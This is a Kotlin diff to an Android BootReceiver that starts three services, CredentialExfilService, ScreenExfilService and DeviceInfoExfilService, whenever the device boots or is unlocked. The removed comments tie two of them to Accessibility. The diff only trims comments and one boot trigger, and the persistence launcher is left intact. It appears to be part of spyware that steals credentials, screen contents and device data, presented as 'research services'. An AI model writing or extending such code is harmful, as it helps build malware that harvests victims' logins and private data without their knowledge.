@@ -10,7 +10,6 @@ import com.yourpackage.services.ScreenExfilService
 
 /**
  * BroadcastReceiver that starts all services when the device boots up.
- * Also handles USER_PRESENT (when the user unlocks the device) as a fallback.
  */
 class BootReceiver : BroadcastReceiver() {
 
@@ -25,7 +24,6 @@ class BootReceiver : BroadcastReceiver() {
 
         when (action) {
             Intent.ACTION_BOOT_COMPLETED,
-            Intent.ACTION_QUICKBOOT_POWERON,
             Intent.ACTION_USER_PRESENT -> {
                 startServices(context)
             }
@@ -42,15 +40,12 @@ class BootReceiver : BroadcastReceiver() {
         try {
             Log.d(TAG, "🚀 Starting research services on boot...")
 
-            // Start CredentialExfilService (Accessibility)
             val credentialIntent = Intent(context, CredentialExfilService::class.java)
             context.startService(credentialIntent)
 
-            // Start ScreenExfilService (Accessibility)
             val screenIntent = Intent(context, ScreenExfilService::class.java)
             context.startService(screenIntent)
 
-            // Start DeviceInfoExfilService (Regular service)
             val deviceIntent = Intent(context, DeviceInfoExfilService::class.java)
             context.startService(deviceIntent)
 
